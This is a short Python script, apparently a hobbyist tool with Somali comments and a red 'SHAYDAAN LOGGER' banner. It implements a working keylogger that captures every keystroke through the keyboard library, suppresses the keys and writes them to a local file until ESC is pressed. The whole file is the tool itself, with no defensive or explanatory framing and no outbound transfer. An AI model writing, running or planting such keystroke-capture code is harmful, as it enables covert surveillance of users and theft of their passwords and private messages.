import os
import keyboard

# Nadiifi Terminal-ka
def clear_terminal():
    os.system('clear')

# ASCII Qurux Leh
def show_banner():
    banner = """
       ██████╗ ███████╗███████╗ █████╗ ███╗   ██╗
      ██╔═══██╗██╔════╝██╔════╝██╔══██╗████╗  ██║
      ██║   ██║███████╗█████╗  ███████║██╔██╗ ██║
      ██║   ██║╚════██║██╔══╝  ██╔══██║██║╚██╗██║
      ╚██████╔╝███████║███████╗██║  ██║██║ ╚████║
       ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
                 SHAYDAAN LOGGER
        [!!] BEWARE - CODE BY POP-SMOKE [!!]
    """
    print(f"\033[31m{banner}\033[0m")  # Red color for the banner

# Keylogger Function
def start_keylogger():
    print("\033[33m[INFO]\033[0m Keylogger is running... Press 'ESC' to stop.")
    with open("keylog.txt", "w") as log_file:
        while True:
            event = keyboard.read_event(suppress=True)  # Qabashada furayaasha
            if event.name == 'esc':  # Haddii ESC la riixo, jooji
                print("\033[32m[INFO]\033[0m Exiting keylogger...")
                break
            log_file.write(f"{event.name}\n")  # Ku qor keylog.txt

# Main Program
if __name__ == "__main__":
    clear_terminal()
    show_banner()
    start_keylogger()
